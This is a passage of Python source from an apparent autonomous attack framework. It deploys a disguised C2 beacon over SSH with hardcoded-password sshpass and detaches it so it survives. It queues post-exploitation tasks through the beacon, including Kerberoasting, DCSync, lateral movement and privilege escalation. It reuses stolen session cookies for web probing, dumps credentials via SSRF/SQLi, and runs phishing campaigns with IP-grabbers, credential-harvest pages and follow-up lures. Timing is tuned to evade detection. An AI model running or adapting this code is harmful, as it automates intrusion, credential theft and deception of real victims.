        c2_host, c2_port = get_c2_endpoint()
        opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
        # WSL toolbox path translation: when the local binary runs through
        # `wsl -d <distro>`, scp executes INSIDE Linux where C:\... is not a
        # valid path (the deploy dies with scp rc=5). Translate to /mnt/c.
        if os.name == "nt" and ":\\" in binary:
            drive, rest = binary[0].lower(), binary[2:].replace("\\", "/")
            binary = f"/mnt/{drive}{rest}"
        # unique staging path per run: a leftover file owned by another
        # user (or a previous run) would make scp fail with EACCES
        import random
        stage = f"/tmp/.systemd-proc-{random.randint(10000, 99999)}"
        scp = (f"sshpass -p {pw} scp -P {port} {opts} -q {binary} "
               f"{user}@{target}:{stage}")
        # The deploy ssh must return immediately: sshpass+`ssh -f` deadlocks
        # (pty) and a plain ssh blocks while the beacon holds the channel.
        # `(setsid nohup ... &)` detaches INSIDE the remote shell. The
        # double-background matters: in `A && B &` bash forks a subshell for
        # the whole list and runs `setsid nohup beacon` in that subshell's
        # FOREGROUND, so the subshell (and ssh) waits on the beacon — when
        # the beacon's first C2 dial hangs (firewalled SYN, no RST) the ssh
        # call blocks until execute_quiet's timeout and the deploy is
        # recorded as failed even though the beacon IS running. With the
        # `( ... & )` wrapper the beacon is backgrounded inside a throwaway
        # subshell: the subshell exits instantly, sshd sees channel EOF and
        # the one-liner returns at once, while the beacon (setsid → new
        # session, nohup → SIGHUP-immune, stdio to /dev/null) survives.
        # NOTE: no LOCAL trailing `&` — a local background would let
        # execute_quiet's pipe-close kill the wsl child mid-scp (the staged
        # file never arrived and the deploy silently no-oped). The local
        # `setsid` only drops the local controlling terminal; it does not
        # detach the REMOTE process group, which is why the remote side
        # needs its own detach.
        run = (f"setsid sshpass -p {pw} ssh -p {port} {opts} {user}@{target} "
               f"\"chmod +x {stage} && (setsid nohup {stage} {c2_host} "
               f"{c2_port} 1 </dev/null >/dev/null 2>&1 &)\"")
        return f"{scp} && {run}"

    def _await_beacon(self, timeout: float = 30.0) -> Optional[str]:
        """Wait for OUR compiled C++ beacon to check in to our own C2.

        Registration is matched by source IP: for network targets that is
        the engagement target itself; for identity targets it is the victim
        machine's IP harvested by the IP-grabber (victim_ip finding). For
        loopback/lab targets the C2 sees a NAT/loopback source (Docker
        Desktop host.docker.internal) — accept the first NEW registration
        in the window there too.
        """
        from phantom.core.c2_server import c2_state
        from phantom.automation.guidance.kit import _effective_target
        from phantom.utils.network import own_ips
        effective = _effective_target(self.wm)
        loopback = effective in ("127.0.0.1", "localhost", "::1")
        mine = own_ips()
        deadline = time.time() + timeout
        seen: set = set()
        while time.time() < deadline:
            for beacon_id, info in c2_state.get_beacons().items():
                if beacon_id in seen:
                    continue
                seen.add(beacon_id)
                ip = info.get("ip") or ""
                # exact match: the listener saw the target's own address
                if ip in (self.target, effective):
                    return beacon_id
                # lab/loopback: the beacon connects back through NAT and the
                # listener sees a private source address
                if loopback and ip.startswith(("172.", "10.", "192.168.", "127.")):
                    return beacon_id
                # real engagement: the target dials out through NAT, so the
                # source IP the listener sees is NOT the target's address.
                # Accept a NEW registration that is not operator-local — our
                # beacon is the only foreign beacon expected in the window.
                if ip and ip not in mine:
                    return beacon_id
            time.sleep(0.3)
        return None

    def _require_beacon_session(self, cap, reason: str) -> bool:
        if self._session is None:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id, reason=reason)
            self.wm.record_failure(cap.id, reason)
            return False
        return True

    def _execute_hunt_capability(self, cap, slots: Dict[str, Any]) -> bool:
        """Behavioural hunting runs through the anomaly engine channel:
        endpoint discovery (robots/sitemap/crawl), baseline probes +
        statistical scoring + validation pass (confirmed/severity) +
        mutation escalation on the winning payloads, all in-process and
        bounded. Requests are stealth-governed and reuse stolen session
        cookies when available. Emits HUNT: marker lines the shared
        interpreter turns into hunt_anomaly findings."""
        from phantom.automation.exploit.anomaly import (
            build_cookie_header, hunt_target)
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        services = []
        for f in self.wm.find("service"):
            v = f.value if isinstance(f.value, dict) else {}
            services.append(v)
        port = str(slots.get("port") or "")
        if port:
            services = [s for s in services if str(s.get("port")) == port]
        cookies = ""
        stolen = self.wm.find("stolen_cookies")
        if stolen:
            v = stolen[0].value if isinstance(stolen[0].value, dict) else {}
            cookies = build_cookie_header(v.get("cookies", []))
        if not cookies:
            cdp = self.wm.find("cdp_cookies")
            if cdp:
                v = cdp[0].value if isinstance(cdp[0].value, dict) else {}
                cookies = build_cookie_header(v.get("cookies", []))
        if self.hunt_delay is not None:
            delay_fn = (lambda: self.hunt_delay)
        else:
            # Human operators drive a web scanner at a steady fast cadence
            # (sub-second), not the 1.5s action cadence used between
            # capabilities. Applying the full governor between probe
            # requests makes one hunt take 10+ minutes (400 probes × 1.5s)
            # — slow enough to look MORE automated, not less. Use a small
            # jittered delay so requests look like a tool run, not a
            # machine-gun burst.
            delay_fn = (lambda: random.uniform(0.15, 0.45))
        try:
            anomalies = hunt_target(self.target, services,
                                    runner=self.hunt_runner,
                                    cookies=cookies, delay_fn=delay_fn,
                                    on_probe=lambda r: self._emit(
                                        "hunt_probe", request=r))
        except Exception as e:
            self.wm.record_action(cap.id, slots, "hunt://web", ok=False,
                                  note=str(e))
            self.wm.record_failure(cap.id, str(e))
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=str(e)[:300])
            return False
        self.wm.record_action(cap.id, slots, "hunt://web", ok=True,
                              note=f"{len(anomalies)} anomaly candidate(s)")
        if not anomalies:
            self.wm.record_failure(cap.id, "no anomaly candidates")
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id,
                       output="no anomaly candidates")
            return False
        lines = []
        for a in anomalies:
            lines.append(
                f"HUNT:cls={a.cls} name={a.name} port={port} "
                f"endpoint={a.endpoint} signals={'|'.join(a.signals)} "
                f"score={a.score:.2f} confirmed={str(a.confirmed).lower()} "
                f"severity={a.severity()} evidence={a.evidence}")
        output = "\n".join(lines)
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit("found", capability=cap.id,
                   findings=[f"{f.kind}:{f.key}" for f in findings],
                   values={f"{f.kind}:{f.key}": (
                       ", ".join(str(x) for x in list(f.value.values())[:3])
                       if isinstance(f.value, dict) else str(f.value))
                       for f in findings})
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_web_creds_capability(self, cap, slots: Dict[str, Any]) -> bool:
        """Web credential extraction runs in-process (like the anomaly
        engine): deterministic SSRF/SQLi probes against the discovered web
        services, bounded and non-destructive. Emits WEBCREDS: markers that
        cap.interpret turns into creds findings for the planner."""
        from phantom.automation.exploit.webcreds import run_web_creds_dump
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        try:
            creds = run_web_creds_dump(self.wm, self.target)
        except Exception as e:
            self.wm.record_action(cap.id, slots, "web://creds", ok=False,
                                  note=str(e))
            self.wm.record_failure(cap.id, str(e))
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=str(e)[:300])
            return False
        self.wm.record_action(cap.id, slots, "web://creds", ok=True,
                              note=f"{len(creds)} credential pair(s)")
        if not creds:
            self.wm.record_failure(cap.id, "no credentials in web app")
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id,
                       output="no credentials in web app")
            return False
        output = "\n".join(c.marker() for c in creds)
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit("found", capability=cap.id,
                   findings=[f"{f.kind}:{f.key}" for f in findings],
                   values={f"{f.kind}:{f.key}": (
                       ", ".join(str(x) for x in list(f.value.values())[:3])
                       if isinstance(f.value, dict) else str(f.value))
                       for f in findings})
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_post_capability(self, cap, slots: Dict[str, Any]) -> bool:
        """Post-exploitation runs THROUGH the beacon channel (C2 task).

        The command is queued to the established beacon session; the result
        is collected from the C2 and interpreted back into findings.
        """
        if not self._require_beacon_session(
                cap, "no beacon session to run post-exploitation"):
            return False
        # injection requires SYSTEM-level privileges confirmed first
        if cap.id == "inject_beacon" and not self.wm.find("system_privilege"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires SYSTEM privileges first")
            self.wm.record_failure(cap.id, "requires SYSTEM privileges first")
            return False
        # AD attack paths require the domain facts first
        if cap.id in ("kerberoast", "as_rep_roast", "dc_sync",
                      "hash_crack") and not self.wm.find("ad_domain"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires domain enumeration (ad_enum) first")
            self.wm.record_failure(cap.id, "requires ad_domain first")
            return False
        # DCSync additionally needs a SYSTEM-level session on the domain
        if cap.id == "dc_sync" and not self.wm.find("system_privilege"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires SYSTEM privileges on the DC first")
            self.wm.record_failure(cap.id, "requires SYSTEM on the DC")
            return False
        # lateral movement needs a peer host inside the engagement scope
        if cap.id in ("lateral_pivot", "smb_pivot", "winrm_pivot") \
                and not slots.get("host"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="no peer host for lateral movement "
                              "(single-target run)")
            self.wm.record_failure(cap.id, "no peer host")
            return False
        # OS-specific escalation vectors only against the matching OS
        from phantom.automation.guidance.kit import _target_os as _target_os_name
        os_name = (slots.get("os") or _target_os_name(self.wm)).lower()
        if cap.id == "privesc_sudo" and "windows" in os_name:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="sudo escalation requires a Linux target")
            self.wm.record_failure(cap.id, "not a Linux target")
            return False
        if cap.id == "privesc_service_perms" and os_name and "windows" not in os_name:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="service-permissions escalation requires Windows")
            self.wm.record_failure(cap.id, "not a Windows target")
            return False
        try:
            cmd = cap.make_command(self.wm, slots)
        except ValueError as e:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id, detail=str(e))
            return False
        cmd = self._dyn.shape(cmd, self.wm)
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        task_id = self._session.task(cmd)
        if task_id is None:
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id,
                       output="task queue failed (no C2 session)")
            self.wm.record_failure(cap.id, "task queue failed")
            return False
        output = self._session.wait_result(task_id, timeout=cap.timeout)
        self.wm.record_action(cap.id, slots, cmd, ok=bool(output is not None),
                              note=f"task {task_id}")
        if output is None:
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output="task timed out")
            self.wm.record_failure(cap.id, f"task {task_id} timed out")
            return False
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit("found", capability=cap.id,
                   findings=[f"{f.kind}:{f.key}" for f in findings])
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_ad_capability(self, cap, slots: Dict[str, Any]) -> bool:
        """AD/domain capabilities are DUAL-channel.

        With a beacon session the command is queued through the C2 (the
        channel used when we are INSIDE the network). Without one the same
        command runs directly from the operator box against the discovered
        DC (LDAP/Kerberos reachable) — so the AD chain (ad_enum →
        kerberoast / as_rep_roast → hash_crack) works with NO beacon at
        all, exactly like a remote AD engagement with only credentials.
        """
        # AD attack paths require the domain facts first (same discipline
        # as the post channel)
        if cap.id in ("kerberoast", "as_rep_roast", "dc_sync",
                      "hash_crack") and not self.wm.find("ad_domain"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires domain enumeration (ad_enum) first")
            self.wm.record_failure(cap.id, "requires ad_domain first")
            return False
        if cap.id == "dc_sync" and not self.wm.find("system_privilege"):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="requires SYSTEM privileges on the DC first")
            self.wm.record_failure(cap.id, "requires SYSTEM on the DC")
            return False
        try:
            cmd = cap.make_command(self.wm, slots)
        except ValueError as e:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id, detail=str(e))
            return False
        cmd = self._dyn.shape(cmd, self.wm)
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        if self._session is not None:
            # beacon channel: queue the task and collect the result
            task_id = self._session.task(cmd)
            if task_id is None:
                self._mark_failed(cap.id)
                self._emit("failed", capability=cap.id,
                           output="task queue failed (no C2 session)")
                self.wm.record_failure(cap.id, "task queue failed")
                return False
            output = self._session.wait_result(task_id, timeout=cap.timeout)
            self.wm.record_action(cap.id, slots, cmd,
                                  ok=bool(output is not None),
                                  note=f"task {task_id}")
            if output is None:
                self._mark_failed(cap.id)
                self._emit("failed", capability=cap.id,
                           output="task timed out")
                self.wm.record_failure(cap.id, f"task {task_id} timed out")
                return False
        else:
            # operator channel: run the tool command from the operator box
            run = self.runtime.run(cmd, category=cap.category,
                                   stealth_level=cap.stealth_level,
                                   agent="agent-1", timeout=cap.timeout)
            self.wm.record_action(cap.id, slots, cmd, ok=run.ok,
                                  opsec=self.runtime.cost_per_action)
            if not run.ok:
                self.wm.record_failure(cap.id, run.output or "execution failed")
                self._mark_failed(cap.id)
                self._emit("failed", capability=cap.id,
                           output=(run.output or "execution failed")[:300])
                self._fallback.record(
                    cap.category, cap.id, self.target, ok=False,
                    reason=(run.output or "execution failed")[:200],
                    elapsed=getattr(run, "elapsed", 0.0))
                return False
            output = run.output or ""
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        self._emit("found", capability=cap.id,
                   findings=[f"{f.kind}:{f.key}" for f in findings])
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _execute_social_capability(self, cap, slots: Dict[str, Any]) -> bool:
        """OSINT/social-engineering capabilities execute through the
        SocialEngine (sherlock/theHarvester, breach lookup, persona mailbox,
        phish delivery, IP-grabber polling) instead of the OS shell.

        The engine emits stable marker lines (IDENTITY:/BREACH:/PERSONA:/
        PHISH_SENT:/VICTIM_IP:) that the shared social interpreter turns
        back into WorldModel findings — so the identity chain converges on
        a real victim_ip and the network chain takes over from there.
        """
        if self.social_engine is None:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="no social engine available")
            self.wm.record_failure(cap.id, "no social engine")
            return False
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost)
        run = self.runtime.run("social:" + cap.id, category=cap.category,
                               stealth_level=cap.stealth_level,
                               agent="agent-1", timeout=cap.timeout)
        try:
            if cap.id in ("harvest_campaign", "wait_follow"):
                # passive human-wait capabilities: poll in chunks, emit
                # 'waiting' events so the operator sees the sleep state,
                # and only succeed when the human actually interacted
                output = self._run_social_wait_capability(cap, slots)
            else:
                output = self._run_social_method(cap.id, slots)
        except Exception as e:
            self.wm.record_action(cap.id, slots, "social:" + cap.id, ok=False,
                                  note=str(e))
            self.wm.record_failure(cap.id, str(e))
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=str(e)[:300])
            return False
        self.wm.record_action(cap.id, slots, "social:" + cap.id, ok=run.ok)
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        if findings:
            self._emit("found", capability=cap.id,
                       findings=[f"{f.kind}:{f.key}" for f in findings],
                       values={f"{f.kind}:{f.key}": (
                           ", ".join(str(x) for x in list(f.value.values())[:3])
                           if isinstance(f.value, dict) else str(f.value))
                           for f in findings})
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _social_wait_horizon(self) -> float:
        """How long the run sleeps waiting for the human (email open / link
        click / DM / follow accept). The fast flag never waits; an explicit
        PHANTOM_SOCIAL_WAIT overrides the default."""
        try:
            v = float(os.getenv("PHANTOM_SOCIAL_WAIT", "").strip())
            if v > 0:
                return v
        except (TypeError, ValueError):
            pass
        return 30.0 if self.speed else 600.0

    def _new_social_findings(self, cap, lines, slots) -> bool:
        """True when interpreting `lines` yields a finding the world does
        not already hold (used to break the wait loop on first contact)."""
        findings = cap.interpret("\n".join(lines), self.wm, slots)
        known = {(f.kind, f.key): f for f in self.wm.all_findings()}
        return any((f.kind, f.key) not in known
                   or known[(f.kind, f.key)].value != f.value for f in findings)

    def _social_cadence_config(self, horizon: float):
        """(delay, max_attempts) for re-engagement follow-ups during a human
        wait. Delay = PHANTOM_SOCIAL_CADENCE seconds when set (0 disables);
        otherwise half the wait horizon, only when the wait is long enough
        to matter (>= 2 minutes — speed-mode waits of 30s never cadence).
        Attempts capped by PHANTOM_SOCIAL_CADENCE_MAX (default 1: one
        second touch per engagement, never spam)."""
        # the fast flag is "no human waits at all": cadence follow-ups only
        # make sense when the engagement is prepared to wait for the target
        if self.speed:
            return 0.0, 0
        try:
            v = float(os.getenv("PHANTOM_SOCIAL_CADENCE", "").strip())
        except (TypeError, ValueError):
            v = 0.0
        if v < 0:
            return 0.0, 0
        delay = v if v > 0 else horizon * 0.5
        if delay <= 0 or horizon < 120.0 and v <= 0:
            return 0.0, 0
        try:
            mx = int(os.getenv("PHANTOM_SOCIAL_CADENCE_MAX", "1").strip())
        except (TypeError, ValueError):
            mx = 1
        return delay, max(0, mx)

    def _run_social_wait_capability(self, cap, slots) -> str:
        """Chunked sleep for a human action: harvest_campaign waits for the
        victim to click/open; wait_follow waits for the target to accept
        the follow request. Emits 'waiting' events each chunk; returns the
        collected markers, or '' when the horizon was exhausted (the caller
        marks the capability failed so the chain escalates, never hangs).

        Cadence: while the lead waits for a CLICK (harvest_campaign only)
        and the target stays silent past the cadence delay, the agent sends
        ONE second-chance lure with a different pretext (SocialEngine
        follow_up) and extends the deadline so the new link has time to be
        clicked. The follow-up markers are NOT fed to the loop-break check
        (a "sent" marker is not an interaction) — only a real open/click
        ends the wait."""
        method = "harvest" if cap.id == "harvest_campaign" else "wait_follow"
        # The interaction (click / follow accept) was already captured in an
        # EARLIER wave: never re-enter the long sleep state for duplicate
        # state — do one quick probe and return. The duplicate markers fail
        # fast upstream (no new facts), so the planner moves on instead of
        # idling another full horizon on markers the world already holds.
        effect_fact = ("victim_ip" if cap.id == "harvest_campaign"
                       else "follow_accepted" if cap.id == "wait_follow" else "")
        if effect_fact and self.wm.has_any(effect_fact):
            try:
                _ok, lines = getattr(self.social_engine, method)(timeout=8.0)
            except Exception as e:
                lines = [f"ERROR: {cap.id} failed: {e}"]
            return "\n".join(lines)
        horizon = self._social_wait_horizon()
        deadline = time.time() + horizon
        collected: List[str] = []
        follow_lines: List[str] = []
        cadence_delay, cadence_max = self._social_cadence_config(horizon)
        sent_follows = 0
        last_follow = time.time()
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            chunk = min(20.0, remaining)
            try:
                ok, lines = getattr(self.social_engine, method)(timeout=chunk)
            except Exception as e:
                lines = [f"ERROR: {cap.id} failed: {e}"]
            collected.extend(lines)
            if self._new_social_findings(cap, collected, slots):
                break
            # cadence: no interaction yet and the grace delay elapsed -> send
            # a second-chance lure (different pretext, fresh tracking link)
            if (method == "harvest" and cadence_delay > 0
                    and sent_follows < cadence_max
                    and time.time() - last_follow >= cadence_delay):
                sent_follows += 1
                last_follow = time.time()
                try:
                    fok, flines = self.social_engine.follow_up(
                        [self.target], use_video=not self.aggressive,
                        use_login_page=self.aggressive)
                except Exception as e:
                    fok, flines = False, [f"ERROR: follow_up failed: {e}"]
                if fok:
                    follow_lines.extend(flines)
                self._emit("cadence", phase=cap.id, attempt=sent_follows,
                           delivered=bool(fok),
                           detail="no interaction yet — sent follow-up lure "
                                  "with a fresh pretext")
                # extend the horizon so the new link gets a real chance
                deadline = max(deadline, time.time() + min(300.0, horizon * 0.5))
            self._emit("waiting", phase=cap.id, remaining=round(remaining, 1),
                       detail="waiting for the human: click / open / accept")
            time.sleep(1.0)
        return "\n".join(collected + follow_lines)

    def _reverse_handle(self) -> str:
        """Resolve the social handle the reverse-engineering pass should
        map. Username target -> the handle itself; email target -> the
        local-part (mario.rossi@corp.com -> mario.rossi); anything else
        -> the first username an OSINT/persona finding pinned on the
        target. Falls back to the raw target so the capability never
        raises on an unknown identity shape."""
        if self.target_type == "username":
            return self.target
        if self.target_type == "email":
            local = (self.target or "").split("@", 1)[0].strip()
            return local or self.target
        try:
            for f in self.wm.findings("identity"):
                u = (f.value or {}).get("username", "") or ""
                if u and "@" not in u and " " not in u:
                    return u
        except Exception:
            pass
        return self.target

    def _run_social_method(self, capability_id: str,
                           slots: Dict[str, Any]) -> str:
        engine = self.social_engine
        # optional config hook (injected/test engines may not implement it)
        if hasattr(engine, "set_social_config"):
            try:
                engine.set_social_config(aggressive=self.aggressive, speed=self.speed)
            except Exception:
                pass
        if capability_id == "osint_identity":
            ok, lines = engine.osint(self.target, self.target_type)
        elif capability_id == "breach_check":
            ok, lines = engine.breach(self.target, self.target_type)
        elif capability_id == "persona_create":
            ok, lines = engine.persona()
        elif capability_id == "persona_profile":
            ok, lines = engine.persona_profile(
                name=self.target if self.target_type == "username" else "")
        elif capability_id == "dossier_analyze":
            ok, lines = engine.dossier()
        elif capability_id == "profile_recon":
            ok, lines = engine.profile_recon(
                self._reverse_handle(), platform=slots.get("platform", ""))
        elif capability_id == "phish_identity":
            # stealth default: video share-link IP grabber; aggressive only:
            # domain-based credential-harvest login pages (louder, but
            # captures credentials directly)
            ok, lines = engine.phish(
                self.target, self.target_type,
                use_video=not self.aggressive,
                use_login_page=self.aggressive)
        elif capability_id == "poll_hits":
            ok, lines = engine.poll(timeout=float(slots.get("timeout", 120)))
        elif capability_id == "campaign_launch":
            targets = [self.target]
            if self.target_type in ("username", "email"):
                targets = [self.target]
            ok, lines = engine.campaign(
                targets=targets, pretext=slots.get("pretext") or None,
                use_video=not self.aggressive,
                use_login_page=self.aggressive)
        elif capability_id == "harvest_campaign":
            # handled by _run_social_wait_capability (chunked human wait)
            ok, lines = engine.harvest(timeout=5.0)
        elif capability_id == "dm_launch":
            targets = [self.target]
            ok, lines = engine.dm(
                targets=targets,
                pretext=slots.get("pretext") or None,
                use_video=not self.aggressive,
                use_login_page=self.aggressive)
        elif capability_id == "dm_follow":
            ok, lines = engine.dm_follow(
                [self.target], platform=slots.get("platform", ""))
        elif capability_id == "wait_follow":
            # handled by _run_social_wait_capability (chunked human wait)
            ok, lines = engine.wait_follow(timeout=5.0)
        else:
            raise ValueError(f"unknown social capability: {capability_id}")
        if not ok:
            raise RuntimeError("\n".join(lines))
        return "\n".join(lines)

    def _materialize_payload(self, command: str) -> str:
        """Write the payload command to a temp file so sandbox backends can
        actually scan/detonate it (Defender, Docker, VM). The dropper is a
        shell script staged from our C2 listener."""
        import os
        import tempfile
        fd, path = tempfile.mkstemp(prefix="phantom_payload_", suffix=".sh",
                                    dir=tempfile.gettempdir())
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(command)
        return path

    def _deploy_sample_path(self) -> str:
        """The artifact the sandbox backends scan/detonate for beacon_deploy:
        the actual binary shipped to the target (the static Linux build when
        present — exactly what _wrap_remote_exec scp's over). Scanning the
        *deployment command* instead validated nothing: a scp/ssh or curl
        dropper cannot run inside the networkless docker container (no
        sshpass, no curl) so it always "crashed" with EXIT:127, and it is
        the binary — not the one-liner — that AV/EDR would ever see."""
        binary = getattr(self, "_last_beacon_binary", "")
        if not binary or not os.path.exists(binary):
            return ""
        static = os.path.join(os.path.dirname(binary), "beacon_linux_static")
        if os.path.exists(static):
            return static
        return binary

    def _preflight(self, capability_id: str,
                   sample_path: str = "") -> SandboxVerdict:
        self._emit("sandbox", capability=capability_id,
                   detail="pre-flight sample validation",
                   sample=sample_path)
        try:
            return self.sandbox.preflight(sample_path)
        except Exception as e:
            return SandboxVerdict(approved=False, results=[],
                                  reason=f"sandbox error: {e}")

    # ------------------------------------------------------------- main loop

    def save_state(self, path: str) -> str:
        """Serialize the full agent state (world model + run discipline) to
        a JSON checkpoint for campaign resume after a restart."""
        state = {
            "schema": 1,
            "target": self.target,
            "target_type": self.target_type,
            "profile": self.profile,
            "aggressive": self.aggressive,
            "stealth": self.stealth,
            "paranoid": self.paranoid,
            "speed": self.speed,
            "goal": self.goal,
            "failed_caps": dict(self._failed_caps),
            "wm": self.wm.to_dict(),
            "saved_at": time.time(),
        }
        path = os.path.abspath(path)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        import json
        with open(path, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2, default=str)
        return path

    @classmethod
    def from_state(cls, path: str,
                   on_event: Optional[Callable[[str, dict]]] = None,
                   scope_list: Optional[List[str]] = None,
                   toolchain: Optional[ToolRegistry] = None,
                   runner: Optional[Callable[[str, float], Any]] = None,
                   cred_discoverer: Optional[Callable[[str], Optional[tuple]]] = None,
                   sandbox: Optional[SandboxEngine] = None,
                   share: Optional[ShareContext] = None,
                   beacon_builder: Optional[Callable[[str, str, int], Optional[str]]] = None,
                   social_engine: Optional[Any] = None,
                   trojan_assets: Optional[Dict[str, str]] = None,
                   command_seed: int = 0,
                   hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
                   hunt_delay: Optional[float] = None) -> "AutonomousAgent":
        """Rebuild an agent from a checkpoint: the world model (findings,
        hypotheses, opsec ledger, identity graph) and the run discipline
        (dead capabilities) are restored exactly as they were."""
        import json
        with open(path, "r", encoding="utf-8") as f:
            state = json.load(f)
        agent = cls(
            target=state.get("target", ""),
            target_type=state.get("target_type", "auto"),
            profile=state.get("profile", "enterprise"),
            aggressive=bool(state.get("aggressive", False)),
            stealth=bool(state.get("stealth", True)),
            paranoid=bool(state.get("paranoid", False)),
            speed=bool(state.get("speed", False)),
            on_event=on_event,
            scope_list=scope_list,
            toolchain=toolchain,
            cred_discoverer=cred_discoverer,
            sandbox=sandbox,
            share=share,
            beacon_builder=beacon_builder,
            social_engine=social_engine,
            trojan_assets=trojan_assets,
            command_seed=command_seed,
            hunt_runner=hunt_runner,
            hunt_delay=hunt_delay,
        )
        if runner is not None:
            from phantom.automation.runtime.stealth_runtime import TimingGovernor
            agent.runtime = StealthRuntime(
                agent.stealth_engine, runner=runner,
                cost_per_action=0.5,
                governor=TimingGovernor(base_delay=0.0, jitter=0.0))
        agent.wm = WorldModel.from_dict(state.get("wm", {}))
        agent._failed_caps = {
            cid: float(ts) for cid, ts in state.get("failed_caps", {}).items()}
        agent.goal = state.get("goal")
        agent._emit("resumed", checkpoint=path, target=agent.target)
        return agent

    def _dead_cap_ids(self) -> frozenset:
        """Capabilities that failed AND have no new facts making them viable
        again — the planner must fall back to alternative sources."""
        return frozenset(
            cid for cid, _ in self._failed_caps.items()
            if self.registry.get(cid) is not None
            and (cid in self._poisoned
                 or not self._retry_eligible(self.registry.get(cid))))

    def _recover_stall(self, goal: str) -> bool:
        """Bounded stall recovery: the planner found no path/move and the goal
        is still unmet. Re-arm the failed capabilities (they may have failed on
        a transient — beacon check-in latency, hunt mutation, dynamic staging)
        so the agent keeps probing toward the beacon instead of halting on the
        first dead-end. Never infinite: a hard recovery budget caps retries.
        """
        if self._recoveries >= self._max_recoveries:
            return False
        self._recoveries += 1
        rearmed = 0

        # Beacon-goal coverage gap: the default scan_tcp is top-ports only,
        # so non-standard management/backdoor ports (2222, 22222, 8081-class
        # custom services) can be invisible. If no remote-access service
        # (SSH/RDP/WinRM/SMB) is known and the beacon is still missing,
        # escalate ONCE to a full-range scan (fast min-rate) before re-arming
        # — otherwise the recovery would just repeat the same blind scan.
        # Applies to any beacon-bound goal (deliver, complete_kill_chain,
        # post_exploit), not just "deliver": speed/aggressive runs start
        # with top-ports and would otherwise never see SSH-on-2222, making
        # beacon_deploy over SSH impossible.
        if goal in ("deliver", "complete_kill_chain", "post_exploit") \
                and not getattr(self, "_deep_scanned", False):
            access_ports = {"22", "2222", "22222", "3389", "5985", "5986", "445"}
            found_access = any(
                f.kind == "service" and isinstance(f.value, dict)
                and str(f.value.get("port", "")) in access_ports
                for f in self.wm._findings.values())
            if not found_access:
                self._deep_scanned = True
                cap = self.registry.get("scan_tcp")
                if cap is not None:
                    from phantom.automation.planner import PlanStep
                    step = PlanStep(capability=cap, slot_values={"port": "1-65535"},
                                    reason="no remote-access service in top ports — "
                                           "escalating to full-range scan")
                    self._emit("recover", goal=goal, rearmed=0,
                               recovery=f"{self._recoveries}/{self._max_recoveries}",
                               detail="no remote-access service found — escalating "
                                      "to full-range port scan")
                    if self._execute_capability(step):
                        rearmed += 1

        # credential-path dead end -> code-execution primitives: when a web
        # service exists but every credential source is exhausted (and no
        # beacon yet), probe the web app for an upload-RCE once — the senior
        # move that reaches the beacon without credentials. Mirrors the
        # full-range-scan escalation above: bounded, once per run.
        if not getattr(self, "_web_rce_escalated", False) \
                and not self.wm.has_any("beacon") \
                and not self.wm.has_any("creds"):
            web_ports = {"80", "443", "8000", "8080", "8081", "8443", "8888"}
            has_web = any(
                f.kind == "service" and isinstance(f.value, dict)
                and (str(f.value.get("port", "")) in web_ports
                     or "http" in str(f.value.get("service", "")).lower())
                for f in self.wm._findings.values())
            if has_web:
                self._web_rce_escalated = True
                cap = self.registry.get("web_rce")
                if cap is not None:
                    from phantom.automation.planner import PlanStep
                    step = PlanStep(capability=cap, slot_values={},
                                    reason="no credential path: probe web "
                                           "code-execution primitives")
                    self._emit("recover", goal=goal, rearmed=0,
                               recovery=f"{self._recoveries}/{self._max_recoveries}",
                               detail="no credential path — escalating to "
                                      "web RCE probe")
                    if self._execute_capability(step):
                        rearmed += 1

        for cid in list(self._failed_caps):
            cap = self.registry.get(cid)
